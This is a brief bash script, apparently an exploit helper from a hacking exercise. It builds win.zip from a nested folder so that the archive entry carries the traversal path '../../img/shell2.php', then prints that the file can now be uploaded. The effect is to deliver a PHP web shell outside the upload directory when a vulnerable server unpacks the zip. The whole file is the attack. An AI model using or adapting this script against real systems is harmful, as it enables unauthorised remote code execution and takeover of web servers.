#!/bin/bash
mkdir ./down
mkdir ./down/down
mkdir ./img
cp shell2.php ./img/shell2.php
cd ./down/down/
zip win.zip ../../img/shell2.php
cd ../../
mv ./down/down/win.zip .
rm -rf down
rm -rf img


echo "You can now upload win.zip"